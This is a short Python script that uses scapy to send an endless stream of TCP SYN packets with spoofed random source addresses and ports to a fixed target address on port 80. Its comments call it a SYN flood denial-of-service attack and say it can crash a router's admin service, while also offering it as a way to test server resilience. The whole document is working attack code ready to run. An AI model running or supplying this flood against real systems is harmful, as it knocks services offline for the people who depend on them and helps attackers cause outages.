
# SYN Flood Attack (DoS)
# Sends thousands of TCP SYN packets with fake IPs and ports to work or target.

# 👉 Real-world use: Test server resilience or simulate a DoS attack.
# On some routers, the admin service may crash.

from scapy.all import *

target = "192.168.1.1"

while True:
    pkt = IP(dst=target, src=RandIP()) / TCP(sport=RandShort(), dport=80, flags="S")
    send(pkt, verbose=0)
